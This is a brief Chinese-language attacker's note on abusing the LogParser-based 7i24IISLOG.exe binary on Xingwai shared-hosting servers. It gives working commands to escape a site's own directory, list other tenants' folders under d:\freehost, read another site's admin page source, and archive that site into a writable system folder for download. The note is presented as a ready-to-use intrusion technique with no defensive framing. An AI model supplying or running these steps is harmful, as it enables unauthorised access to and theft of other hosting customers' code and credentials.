星外主机跨目录技巧

note

列目录 + 文件读取 + 文件打包

可执行文件

7i24IISLOG.exe 其实就是微软的 LogParser

列目录

cmd: c:\windows\7i24IISLOG.exe
args: "select top 100 path from d:\freehost\*.*" -i:FS -rtp:-1

文件读取

cmd: c:\windows\7i24IISLOG.exe
args: "select text from d:\freehost\xinyuidc\web\admin\index.asp" -i:textline -rtp:-1

文件打包

cmd: c:\windows\7i24IISLOG3.exe
args: d:\freehost\xinyuidc\web\ "C:\Documents and Settings\All Users\Application Data\Microsoft\Media Index\web.rar"
